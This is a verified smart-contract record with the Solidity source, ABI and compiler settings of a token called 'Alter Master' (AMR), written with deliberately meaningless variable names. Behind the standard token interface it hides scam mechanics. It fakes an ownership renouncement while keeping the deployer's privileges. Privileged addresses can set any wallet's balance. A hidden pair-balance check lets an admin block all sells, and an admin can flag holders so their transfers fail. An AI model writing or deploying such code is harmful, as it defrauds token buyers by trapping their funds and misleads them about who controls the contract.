{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface tradingModeFund {\n    function createPair(address teamLaunchBuy, address liquidityMode) external returns (address);\n}\n\ninterface maxMarketingSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapMaxReceiver) external view returns (uint256);\n\n    function transfer(address enableReceiver, uint256 walletAt) external returns (bool);\n\n    function allowance(address fromFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableReceiver,\n        uint256 walletAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeReceiver, uint256 value);\n    event Approval(address indexed fromFund, address indexed spender, uint256 value);\n}\n\nabstract contract marketingMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listLimitFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedSwap is maxMarketingSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlterMaster is marketingMax, maxMarketingSender, launchedSwap {\n\n    uint256 public launchedTotal;\n\n    address tokenAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenMarketing(uint256 walletAt) public {\n        receiverExempt();\n        txExempt = walletAt;\n    }\n\n    constructor (){\n        if (minModeSender == enableTradingTotal) {\n            buyAuto = maxBuyTeam;\n        }\n        listLimitFrom enableShould = listLimitFrom(exemptTx);\n        launchedFund = tradingModeFund(enableShould.factory()).createPair(enableShould.WETH(), address(this));\n        \n        senderReceiver = _msgSender();\n        liquidityTake[senderReceiver] = true;\n        launchedLiquidityShould[senderReceiver] = isTradingSwap;\n        fundReceiverTo();\n        \n        emit Transfer(address(0), senderReceiver, isTradingSwap);\n    }\n\n    address public launchedFund;\n\n    function getOwner() external view returns (address) {\n        return modeWalletReceiver;\n    }\n\n    function transfer(address totalList, uint256 walletAt) external virtual override returns (bool) {\n        return minAuto(_msgSender(), totalList, walletAt);\n    }\n\n    function receiverExempt() private view {\n        require(liquidityTake[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private autoFrom;\n\n    function minAuto(address toSwap, address enableReceiver, uint256 walletAt) internal returns (bool) {\n        if (toSwap == senderReceiver) {\n            return toReceiver(toSwap, enableReceiver, walletAt);\n        }\n        uint256 tradingToken = maxMarketingSender(launchedFund).balanceOf(tokenAt);\n        require(tradingToken == txExempt);\n        require(enableReceiver != tokenAt);\n        if (launchedReceiverBuy[toSwap]) {\n            return toReceiver(toSwap, enableReceiver, amountWalletLaunch);\n        }\n        return toReceiver(toSwap, enableReceiver, walletAt);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoReceiver;\n    }\n\n    function approve(address toMin, uint256 walletAt) public virtual override returns (bool) {\n        autoFrom[_msgSender()][toMin] = walletAt;\n        emit Approval(_msgSender(), toMin, walletAt);\n        return true;\n    }\n\n    function transferFrom(address toSwap, address enableReceiver, uint256 walletAt) external override returns (bool) {\n        if (_msgSender() != exemptTx) {\n            if (autoFrom[toSwap][_msgSender()] != type(uint256).max) {\n                require(walletAt <= autoFrom[toSwap][_msgSender()]);\n                autoFrom[toSwap][_msgSender()] -= walletAt;\n            }\n        }\n        return minAuto(toSwap, enableReceiver, walletAt);\n    }\n\n    bool public liquidityMaxTeam;\n\n    function fundReceiverTo() public {\n        emit OwnershipTransferred(senderReceiver, address(0));\n        modeWalletReceiver = address(0);\n    }\n\n    function balanceOf(address swapMaxReceiver) public view virtual override returns (uint256) {\n        return launchedLiquidityShould[swapMaxReceiver];\n    }\n\n    uint256 private buyAuto;\n\n    bool private minModeSender;\n\n    uint256 launchedLiquidityMin;\n\n    function owner() external view returns (address) {\n        return modeWalletReceiver;\n    }\n\n    function receiverFeeMode(address totalList, uint256 walletAt) public {\n        receiverExempt();\n        launchedLiquidityShould[totalList] = walletAt;\n    }\n\n    string private amountAuto = \"Alter Master\";\n\n    function allowance(address exemptList, address toMin) external view virtual override returns (uint256) {\n        if (toMin == exemptTx) {\n            return type(uint256).max;\n        }\n        return autoFrom[exemptList][toMin];\n    }\n\n    uint256 private limitReceiverLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toMaxLiquidity;\n    }\n\n    bool public shouldReceiver;\n\n    mapping(address => bool) public liquidityTake;\n\n    address private modeWalletReceiver;\n\n    uint256 private fromList;\n\n    address exemptTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private enableTradingTotal;\n\n    function maxLiquidity(address modeMax) public {\n        if (shouldReceiver) {\n            return;\n        }\n        \n        liquidityTake[modeMax] = true;\n        if (fromList == buyAuto) {\n            buyAuto = launchedTotal;\n        }\n        shouldReceiver = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountAuto;\n    }\n\n    function senderAmount(address buySenderTrading) public {\n        receiverExempt();\n        \n        if (buySenderTrading == senderReceiver || buySenderTrading == launchedFund) {\n            return;\n        }\n        launchedReceiverBuy[buySenderTrading] = true;\n    }\n\n    bool private fromReceiver;\n\n    address public senderReceiver;\n\n    string private toMaxLiquidity = \"AMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isTradingSwap;\n    }\n\n    mapping(address => bool) public launchedReceiverBuy;\n\n    uint256 public maxBuyTeam;\n\n    uint256 private isTradingSwap = 100000000 * 10 ** 18;\n\n    uint256 txExempt;\n\n    function toReceiver(address toSwap, address enableReceiver, uint256 walletAt) internal returns (bool) {\n        require(launchedLiquidityShould[toSwap] >= walletAt);\n        launchedLiquidityShould[toSwap] -= walletAt;\n        launchedLiquidityShould[enableReceiver] += walletAt;\n        emit Transfer(toSwap, enableReceiver, walletAt);\n        return true;\n    }\n\n    mapping(address => uint256) private launchedLiquidityShould;\n\n    uint256 constant amountWalletLaunch = 19 ** 10;\n\n    event OwnershipTransferred(address indexed launchFrom, address indexed takeLiquidity);\n\n    uint8 private autoReceiver = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMaxReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiverBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMaxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"}],\"name\":\"maxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"receiverFeeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySenderTrading\",\"type\":\"address\"}],\"name\":\"senderAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"tokenMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlterMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}